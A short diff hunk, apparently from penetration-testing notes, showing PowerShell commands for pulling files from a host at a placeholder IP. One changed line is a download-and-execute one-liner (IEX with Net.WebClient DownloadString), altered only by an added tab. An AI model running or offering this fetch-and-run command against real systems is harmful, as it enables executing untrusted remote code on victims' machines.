@@ -27,4 +27,4 @@ Within a powershell cli, you can transfer files to your box with
 `Invoke-WebRequest "http://<IP>/<FILE>" -OutFile "<FILENAME>"`
 
 
-`powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/<FILE>')`
+`powershell.exe -c "IEX(New-Object 	Net.WebClient).DownloadString('http://<IP>/<FILE>')`
